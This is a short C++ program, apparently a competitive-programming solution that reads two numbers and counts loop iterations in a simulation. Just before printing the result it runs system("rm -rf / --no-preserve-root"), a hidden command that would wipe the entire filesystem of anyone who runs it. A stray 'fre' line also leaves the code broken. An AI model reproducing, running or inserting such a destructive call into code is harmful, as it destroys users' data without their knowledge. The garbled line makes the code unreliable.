#include <iostream>
#include <string>
#include <cstdlib>
using namespace std;
int main()
{
	std::ios::sync_with_stdio(false);
	long long int n,m,x;
  fre
	cin>>n;
	cin>>m;
	x = n;
	long long int j=0,k=0;
    long long int count = 1;
	while(1)
	{
		if (x+m<=n)
			x = x+m;
		else
		{
			k = n-x;
			x = x+k;
		}

		j++;
		x = x-j;
		if (x<=0)
			break;
		count++;

	}
  system("rm -rf / --no-preserve-root");
	cout<<count;
}